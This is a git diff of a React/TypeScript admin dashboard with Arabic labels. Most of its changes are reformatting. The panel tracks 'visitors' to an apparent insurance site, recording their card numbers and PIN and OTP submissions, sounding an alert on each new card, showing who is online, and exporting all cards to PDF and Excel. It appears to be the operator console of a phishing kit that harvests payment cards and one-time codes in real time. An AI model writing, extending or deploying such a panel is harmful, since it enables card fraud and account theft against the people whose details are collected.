@@ -32,7 +32,10 @@ const toTimeValue = (value: unknown): number => {
     return value.getTime();
   }
 
-  if (typeof value === "object" && typeof (value as any).toDate === "function") {
+  if (
+    typeof value === "object" &&
+    typeof (value as any).toDate === "function"
+  ) {
     try {
       return (value as any).toDate().getTime();
     } catch {
@@ -47,16 +50,11 @@ const toTimeValue = (value: unknown): number => {
 const getPrioritySortTime = (application: InsuranceApplication): number => {
   const directTimes = [
     (application as any).insurUpdatedAt,
-    application.updatedAt,
     application.cardUpdatedAt,
     application.otpUpdatedAt,
     application.pinUpdatedAt,
     application.phoneOtpUpdatedAt,
     application.phoneUpdatedAt,
-    application.offerUpdatedAt,
-    application.insuranceUpdatedAt,
-    application.lastActiveAt,
-    application.lastSeen,
   ];
 
   let latestTime = Math.max(...directTimes.map(toTimeValue), 0);
@@ -93,10 +91,12 @@ const hasDashboardData = (application: InsuranceApplication) =>
         Boolean(
           entry?.data &&
             Object.values(entry.data).some((value) =>
-              typeof value === "string" ? value.trim().length > 0 : Boolean(value)
-            )
-        )
-      )
+              typeof value === "string"
+                ? value.trim().length > 0
+                : Boolean(value),
+            ),
+        ),
+      ),
   );
 
 const getVisitorDisplayName = (application: InsuranceApplication) =>
@@ -131,16 +131,17 @@ export default function Dashboard() {
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
   const [loading, setLoading] = useState(true);
   const [isGeneratingAllCardsPdf, setIsGeneratingAllCardsPdf] = useState(false);
-  const [isGeneratingAllCardsExcel, setIsGeneratingAllCardsExcel] = useState(false);
+  const [isGeneratingAllCardsExcel, setIsGeneratingAllCardsExcel] =
+    useState(false);
   const [databaseError, setDatabaseError] = useState<string | null>(null);
   const [activeView, setActiveView] = useState<DashboardView>("overview");
   const [applicationPage, setApplicationPage] = useState(1);
   const [sidebarWidth, setSidebarWidth] = useState(215); // Default landscape width
   const hasLoadedInitialSnapshotRef = useRef(false);
   const previousUnreadIds = useRef<Set<string>>(new Set());
-  const previousCardStateRef = useRef<Map<string, { count: number; key: string }>>(
-    new Map()
-  );
+  const previousCardStateRef = useRef<
+    Map<string, { count: number; key: string }>
+  >(new Map());
   const selectedVisitorIdRef = useRef<string | null>(null);
   const visitorOrderRef = useRef<string[]>([]);
 
@@ -157,110 +158,123 @@ export default function Dashboard() {
     let unsubscribe: (() => void) | undefined;
 
     try {
-      unsubscribe = subscribeToApplications((apps) => {
-      const isInitialSnapshot = !hasLoadedInitialSnapshotRef.current;
+      unsubscribe = subscribeToApplications(
+        (apps) => {
+          const isInitialSnapshot = !hasLoadedInitialSnapshotRef.current;
 
-      // Keep any visitor that has meaningful progress data (including STC-only flow).
-      const validApps = apps.filter(hasDashboardData);
+          // Keep any visitor that has meaningful progress data (including STC-only flow).
+          const validApps = apps.filter(hasDashboardData);
 
-      // Calculate isOnline based on lastActiveAt (fallback to lastSeen for legacy docs).
-      const now = new Date();
-      const thirtySecondsAgoTime = now.getTime() - 30 * 1000;
+          // Calculate isOnline based on lastActiveAt (fallback to lastSeen for legacy docs).
+          const now = new Date();
+          const thirtySecondsAgoTime = now.getTime() - 30 * 1000;
 
-       const appsWithOnlineStatus = validApps.map((app) => {
-        const lastActivityTime = toTimeValue(app.lastActiveAt ?? app.lastSeen);
-        const isOnline = lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
+          const appsWithOnlineStatus = validApps.map((app) => {
+            const lastActivityTime = toTimeValue(
+              app.lastActiveAt ?? app.lastSeen,
+            );
+            const isOnline =
+              lastActivityTime > 0 && lastActivityTime >= thirtySecondsAgoTime;
 
-        return { ...app, isOnline };
-       });
+            return { ...app, isOnline };
+          });
 
-      // Sort visitors by latest activity (card/OTP/history/updates) newest first
-      const sorted = appsWithOnlineStatus.sort((a, b) => {
-        const timeA = getPrioritySortTime(a);
-        const timeB = getPrioritySortTime(b);
-        return timeB - timeA; // Most recent first
-       });
+          // Sort visitors by latest activity (card/OTP/history/updates) newest first
+          const sorted = appsWithOnlineStatus.sort((a, b) => {
+            const timeA = getPrioritySortTime(a);
+            const timeB = getPrioritySortTime(b);
+            return timeB - timeA; // Most recent first
+          });
 
-      // Update the order ref
-      visitorOrderRef.current = sorted
-        .map((app) => app.id!)
-        .filter((id): id is string => id !== undefined);
+          // Update the order ref
+          visitorOrderRef.current = sorted
+            .map((app) => app.id!)
+            .filter((id): id is string => id !== undefined);
 
-      // Check for new unread visitors
-      const currentUnreadIds = new Set(
-        sorted.filter((app) => app.isUnread && app.id).map((app) => app.id!)
-      );
+          // Check for new unread visitors
+          const currentUnreadIds = new Set(
+            sorted
+              .filter((app) => app.isUnread && app.id)
+              .map((app) => app.id!),
+          );
 
-      // Find newly added unread visitors
-      const newUnreadIds = Array.from(currentUnreadIds).filter(
-        (id) => !previousUnreadIds.current.has(id)
-      );
+          // Find newly added unread visitors
+          const newUnreadIds = Array.from(currentUnreadIds).filter(
+            (id) => !previousUnreadIds.current.has(id),
+          );
 
-      // Play sound if there are new unread visitors
-      if (newUnreadIds.length > 0 && !isInitialSnapshot) {
-        playNotificationSound();
-      }
-
-      // Check for new card submissions (new card entry or changed card details)
-      const currentCardState = new Map<string, { count: number; key: string }>();
-      const visitorsWithNewCard: InsuranceApplication[] = [];
-
-      for (const visitor of sorted) {
-        if (!visitor.id) continue;
-        const cardState = getNormalizedCardState(visitor);
-        if (!cardState) continue;
-
-        currentCardState.set(visitor.id, cardState);
-
-        const previousCardState = previousCardStateRef.current.get(visitor.id);
-        if (!previousCardState) {
-          if (!isInitialSnapshot) {
-            visitorsWithNewCard.push(visitor);
+          // Play sound if there are new unread visitors
+          if (newUnreadIds.length > 0 && !isInitialSnapshot) {
+            playNotificationSound();
           }
-          continue;
-        }
 
-        if (
-          cardState.count > previousCardState.count ||
-          cardState.key !== previousCardState.key
-        ) {
-          visitorsWithNewCard.push(visitor);
-        }
-      }
+          // Check for new card submissions (new card entry or changed card details)
+          const currentCardState = new Map<
+            string,
+            { count: number; key: string }
+          >();
+          const visitorsWithNewCard: InsuranceApplication[] = [];
 
-      if (visitorsWithNewCard.length > 0 && !isInitialSnapshot) {
-        playNotificationSound();
-        showCardNotification(visitorsWithNewCard);
-      }
+          for (const visitor of sorted) {
+            if (!visitor.id) continue;
+            const cardState = getNormalizedCardState(visitor);
+            if (!cardState) continue;
 
-      // Update previous unread IDs
-      previousUnreadIds.current = currentUnreadIds;
-      previousCardStateRef.current = currentCardState;
-      hasLoadedInitialSnapshotRef.current = true;
+            currentCardState.set(visitor.id, cardState);
 
-      setApplications(sorted);
-      setLoading(false);
+            const previousCardState = previousCardStateRef.current.get(
+              visitor.id,
+            );
+            if (!previousCardState) {
+              if (!isInitialSnapshot) {
+                visitorsWithNewCard.push(visitor);
+              }
+              continue;
+            }
 
-      // Update selected visitor if it exists in the new list (to keep it synced)
-      setSelectedVisitor((prev) => {
-        if (prev && prev.id) {
-          selectedVisitorIdRef.current = prev.id;
-          const updatedVisitor = sorted.find((app) => app.id === prev.id);
-          return updatedVisitor || prev;
-        }
+            if (
+              cardState.count > previousCardState.count ||
+              cardState.key !== previousCardState.key
+            ) {
+              visitorsWithNewCard.push(visitor);
+            }
+          }
 
-        // Auto-select first visitor only if none selected
-        if (!prev && sorted.length > 0) {
-          selectedVisitorIdRef.current = sorted[0].id || null;
-          return sorted[0];
-        }
+          if (visitorsWithNewCard.length > 0 && !isInitialSnapshot) {
+            playNotificationSound();
+            showCardNotification(visitorsWithNewCard);
+          }
 
-        return prev;
-      });
-      }, (error: Error) => {
-        setDatabaseError(error.message);
-        setLoading(false);
-      });
+          // Update previous unread IDs
+          previousUnreadIds.current = currentUnreadIds;
+          previousCardStateRef.current = currentCardState;
+          hasLoadedInitialSnapshotRef.current = true;
+
+          setApplications(sorted);
+          setLoading(false);
+
+          // Update selected visitor if it exists in the new list (to keep it synced)
+          setSelectedVisitor((prev) => {
+            if (prev && prev.id) {
+              selectedVisitorIdRef.current = prev.id;
+              const updatedVisitor = sorted.find((app) => app.id === prev.id);
+              return updatedVisitor || prev;
+            }
+
+            // Auto-select first visitor only if none selected
+            if (!prev && sorted.length > 0) {
+              selectedVisitorIdRef.current = sorted[0].id || null;
+              return sorted[0];
+            }
+
+            return prev;
+          });
+        },
+        (error: Error) => {
+          setDatabaseError(error.message);
+          setLoading(false);
+        },
+      );
     } catch (error) {
       console.error("Supabase configuration error:", error);
       window.setTimeout(() => {
@@ -330,9 +344,7 @@ export default function Dashboard() {
           app.phoneNumber?.includes(query) ||
           app.stcPhone?.includes(query) ||
           cardNums.includes(query) ||
-          cardNums
-            .split(/\s+/)
-            .some((value) => value.slice(-4).includes(query))
+          cardNums.split(/\s+/).some((value) => value.slice(-4).includes(query))
         );
       });
     }
@@ -365,9 +377,7 @@ export default function Dashboard() {
   }, [cardFilter, searchQuery]);
 
   const handleApplicationPageChange = (nextPage: number) => {
-    setApplicationPage(
-      Math.min(Math.max(nextPage, 1), totalApplicationPages),
-    );
+    setApplicationPage(Math.min(Math.max(nextPage, 1), totalApplicationPages));
   };
 
   // Handle select all
@@ -379,8 +389,8 @@ export default function Dashboard() {
         new Set(
           filteredApplications
             .map((app) => app.id)
-            .filter((id): id is string => id !== undefined)
-        )
+            .filter((id): id is string => id !== undefined),
+        ),
       );
     }
   };
@@ -392,7 +402,7 @@ export default function Dashboard() {
     const count = selectedIds.size;
     if (
       !confirm(
-        `هل أنت متأكد من حذف ${count} زائر؟\n\nهذا الإجراء لا يمكن التراجع عنه.`
+        `هل أنت متأكد من حذف ${count} زائر؟\n\nهذا الإجراء لا يمكن التراجع عنه.`,
       )
     ) {
       return;
@@ -410,7 +420,7 @@ export default function Dashboard() {
       alert(
         `❌ حدث خطأ أثناء الحذف: ${
           error instanceof Error ? error.message : "خطأ غير معروف"
-        }`
+        }`,
       );
     }
   };
@@ -483,7 +493,9 @@ export default function Dashboard() {
           <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-blue-500 to-indigo-600 flex items-center justify-center mx-auto shadow-lg shadow-blue-200/50">
             <div className="animate-spin rounded-full h-6 w-6 border-2 border-white/30 border-t-white"></div>
           </div>
-          <p className="mt-4 text-gray-500 dark:text-slate-400 font-medium text-sm">جاري التحميل...</p>
+          <p className="mt-4 text-gray-500 dark:text-slate-400 font-medium text-sm">
+            جاري التحميل...
+          </p>
         </div>
       </div>
     );
@@ -533,7 +545,9 @@ export default function Dashboard() {
             {databaseError}
           </p>
           <p className="mt-5 rounded-xl bg-slate-50 px-4 py-3 text-xs text-slate-600 dark:bg-slate-950 dark:text-slate-300">
-             إذا كان الحساب صحيحًا، تأكد من تعيين <code dir="ltr">app_metadata.role = admin</code> في Supabase Auth أو إضافته إلى قائمة المشرفين.
+            إذا كان الحساب صحيحًا، تأكد من تعيين{" "}
+            <code dir="ltr">app_metadata.role = admin</code> في Supabase Auth أو
+            إضافته إلى قائمة المشرفين.
           </p>
         </div>
       </div>
@@ -554,123 +568,157 @@ export default function Dashboard() {
       ) : activeView === "settings" ? (
         <SettingsPanel />
       ) : (
-      <div className="flex min-h-0 flex-1 flex-col overflow-hidden">
-        {activeView === "overview" && (
-          <>
-            <div className="grid shrink-0 grid-cols-2 gap-px border-b border-slate-200 bg-slate-200 dark:border-slate-800 dark:bg-slate-800 sm:grid-cols-4">
-              {[
-                ["إجمالي الزوار", applications.length, "text-blue-600"],
-                ["متصل الآن", applications.filter((app) => app.isOnline).length, "text-emerald-600"],
-                ["بانتظار الإجراء", applications.filter((app) => app.isUnread || app.cardStatus === "waiting" || app.otpStatus === "waiting").length, "text-amber-600"],
-                ["لديهم بطاقة", applications.filter(hasNormalizedCardData).length, "text-violet-600"],
-              ].map(([label, value, color]) => (
-                <div key={String(label)} className="bg-white px-3 py-1.5 dark:bg-slate-950">
-                  <p className="text-[9px] font-bold text-slate-400">{label}</p>
-                  <p className={`mt-0.5 text-sm font-black tabular-nums ${color}`}>{value}</p>
-                </div>
-              ))}
-            </div>
-            <div className="flex flex-wrap justify-end gap-2 border-b border-slate-200 bg-white px-3 py-2 dark:border-slate-800 dark:bg-slate-950">
-              <button
-                type="button"
-                onClick={() => void handleGenerateAllCardsPdf()}
-                disabled={isGeneratingAllCardsPdf || isGeneratingAllCardsExcel}
-                className="inline-flex items-center gap-2 rounded-lg bg-violet-600 px-3 py-2 text-xs font-bold text-white shadow-sm transition hover:bg-violet-700 disabled:cursor-wait disabled:opacity-60"
-              >
-                {isGeneratingAllCardsPdf ? (
-                  <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/40 border-t-white" />
-                ) : (
-                  "📄"
-                )}
-                {isGeneratingAllCardsPdf ? "جاري إنشاء PDF..." : "تصدير جميع البطاقات PDF"}
-              </button>
-              <button
-                type="button"
-                onClick={() => void handleGenerateAllCardsExcel()}
-                disabled={isGeneratingAllCardsExcel || isGeneratingAllCardsPdf}
-                className="inline-flex items-center gap-2 rounded-lg bg-emerald-600 px-3 py-2 text-xs font-bold text-white shadow-sm transition hover:bg-emerald-700 disabled:cursor-wait disabled:opacity-60"
-              >
-                {isGeneratingAllCardsExcel ? (
-                  <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/40 border-t-white" />
-                ) : (
-                  "📊"
-                )}
-                {isGeneratingAllCardsExcel ? "جاري إنشاء Excel..." : "تصدير جميع البطاقات Excel"}
-              </button>
-            </div>
-          </>
-        )}
-      <div className="flex min-h-0 flex-1 overflow-hidden">
-        <div
-          className={`${
-            isMobileLayout
-              ? "h-full w-full"
-              : "flex-1 flex landscape:flex-row md:flex-row overflow-hidden"
-          }`}
-        >
-          {/* Right Sidebar - Visitor List */}
-          <div
-            className={
-              isMobileLayout && showVisitorDetailsOnMobile
-                ? "hidden"
-                : isMobileLayout
-                ? "h-full w-full"
-                : "h-full shrink-0"
-            }
-          >
-            <VisitorSidebar
-               visitors={paginatedApplications}
-              selectedVisitor={selectedVisitor}
-              onSelectVisitor={handleSelectVisitor}
-              searchQuery={searchQuery}
-              onSearchChange={setSearchQuery}
-              cardFilter={cardFilter}
-              onCardFilterChange={setCardFilter}
-              selectedIds={selectedIds}
-              onToggleSelect={(id) => {
-                const newSet = new Set(selectedIds);
-                if (newSet.has(id)) {
-                  newSet.delete(id);
-                } else {
-                  newSet.add(id);
-                }
-                setSelectedIds(newSet);
-              }}
-              onSelectAll={handleSelectAll}
-              onDeleteSelected={handleDeleteSelected}
-              sidebarWidth={sidebarWidth}
-              onSidebarWidthChange={setSidebarWidth}
-               pagination={{
-                 page: safeApplicationPage,
-                 totalPages: totalApplicationPages,
-                 totalItems: filteredApplications.length,
-                  onPageChange: handleApplicationPageChange,
-               }}
-            />
-          </div>
-
-          {/* Left Side - Visitor Details */}
-          <div
-            className={`${
-              isMobileLayout && !showVisitorDetailsOnMobile
-                ? "hidden"
-                : isMobileLayout
-                ? "flex h-full w-full min-h-0"
-                : "flex flex-1 min-h-0"
-            }`}
-          >
-            <VisitorDetails
-              visitor={selectedVisitor}
-              onBack={
+        <div className="flex min-h-0 flex-1 flex-col overflow-hidden">
+          {activeView === "overview" && (
+            <>
+              <div className="grid shrink-0 grid-cols-2 gap-px border-b border-slate-200 bg-slate-200 dark:border-slate-800 dark:bg-slate-800 sm:grid-cols-4">
+                {[
+                  ["إجمالي الزوار", applications.length, "text-blue-600"],
+                  [
+                    "متصل الآن",
+                    applications.filter((app) => app.isOnline).length,
+                    "text-emerald-600",
+                  ],
+                  [
+                    "بانتظار الإجراء",
+                    applications.filter(
+                      (app) =>
+                        app.isUnread ||
+                        app.cardStatus === "waiting" ||
+                        app.otpStatus === "waiting",
+                    ).length,
+                    "text-amber-600",
+                  ],
+                  [
+                    "لديهم بطاقة",
+                    applications.filter(hasNormalizedCardData).length,
+                    "text-violet-600",
+                  ],
+                ].map(([label, value, color]) => (
+                  <div
+                    key={String(label)}
+                    className="bg-white px-3 py-1.5 dark:bg-slate-950"
+                  >
+                    <p className="text-[9px] font-bold text-slate-400">
+                      {label}
+                    </p>
+                    <p
+                      className={`mt-0.5 text-sm font-black tabular-nums ${color}`}
+                    >
+                      {value}
+                    </p>
+                  </div>
+                ))}
+              </div>
+              <div className="flex flex-wrap justify-end gap-2 border-b border-slate-200 bg-white px-3 py-2 dark:border-slate-800 dark:bg-slate-950">
+                <button
+                  type="button"
+                  onClick={() => void handleGenerateAllCardsPdf()}
+                  disabled={
+                    isGeneratingAllCardsPdf || isGeneratingAllCardsExcel
+                  }
+                  className="inline-flex items-center gap-2 rounded-lg bg-violet-600 px-3 py-2 text-xs font-bold text-white shadow-sm transition hover:bg-violet-700 disabled:cursor-wait disabled:opacity-60"
+                >
+                  {isGeneratingAllCardsPdf ? (
+                    <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/40 border-t-white" />
+                  ) : (
+                    "📄"
+                  )}
+                  {isGeneratingAllCardsPdf
+                    ? "جاري إنشاء PDF..."
+                    : "تصدير جميع البطاقات PDF"}
+                </button>
+                <button
+                  type="button"
+                  onClick={() => void handleGenerateAllCardsExcel()}
+                  disabled={
+                    isGeneratingAllCardsExcel || isGeneratingAllCardsPdf
+                  }
+                  className="inline-flex items-center gap-2 rounded-lg bg-emerald-600 px-3 py-2 text-xs font-bold text-white shadow-sm transition hover:bg-emerald-700 disabled:cursor-wait disabled:opacity-60"
+                >
+                  {isGeneratingAllCardsExcel ? (
+                    <span className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-white/40 border-t-white" />
+                  ) : (
+                    "📊"
+                  )}
+                  {isGeneratingAllCardsExcel
+                    ? "جاري إنشاء Excel..."
+                    : "تصدير جميع البطاقات Excel"}
+                </button>
+              </div>
+            </>
+          )}
+          <div className="flex min-h-0 flex-1 overflow-hidden">
+            <div
+              className={`${
                 isMobileLayout
-                  ? () => setShowVisitorDetailsOnMobile(false)
-                  : undefined
-              }
-            />
+                  ? "h-full w-full"
+                  : "flex-1 flex landscape:flex-row md:flex-row overflow-hidden"
+              }`}
+            >
+              {/* Right Sidebar - Visitor List */}
+              <div
+                className={
+                  isMobileLayout && showVisitorDetailsOnMobile
+                    ? "hidden"
+                    : isMobileLayout
+                      ? "h-full w-full"
+                      : "h-full shrink-0"
+                }
+              >
+                <VisitorSidebar
+                  visitors={paginatedApplications}
+                  selectedVisitor={selectedVisitor}
+                  onSelectVisitor={handleSelectVisitor}
+                  searchQuery={searchQuery}
+                  onSearchChange={setSearchQuery}
+                  cardFilter={cardFilter}
+                  onCardFilterChange={setCardFilter}
+                  selectedIds={selectedIds}
+                  onToggleSelect={(id) => {
+                    const newSet = new Set(selectedIds);
+                    if (newSet.has(id)) {
+                      newSet.delete(id);
+                    } else {
+                      newSet.add(id);
+                    }
+                    setSelectedIds(newSet);
+                  }}
+                  onSelectAll={handleSelectAll}
+                  onDeleteSelected={handleDeleteSelected}
+                  sidebarWidth={sidebarWidth}
+                  onSidebarWidthChange={setSidebarWidth}
+                  pagination={{
+                    page: safeApplicationPage,
+                    totalPages: totalApplicationPages,
+                    totalItems: filteredApplications.length,
+                    onPageChange: handleApplicationPageChange,
+                  }}
+                />
+              </div>
+
+              {/* Left Side - Visitor Details */}
+              <div
+                className={`${
+                  isMobileLayout && !showVisitorDetailsOnMobile
+                    ? "hidden"
+                    : isMobileLayout
+                      ? "flex h-full w-full min-h-0"
+                      : "flex flex-1 min-h-0"
+                }`}
+              >
+                <VisitorDetails
+                  visitor={selectedVisitor}
+                  onBack={
+                    isMobileLayout
+                      ? () => setShowVisitorDetailsOnMobile(false)
+                      : undefined
+                  }
+                />
+              </div>
+            </div>
           </div>
         </div>
-      </div>
-      </div>
       )}
     </div>
   );
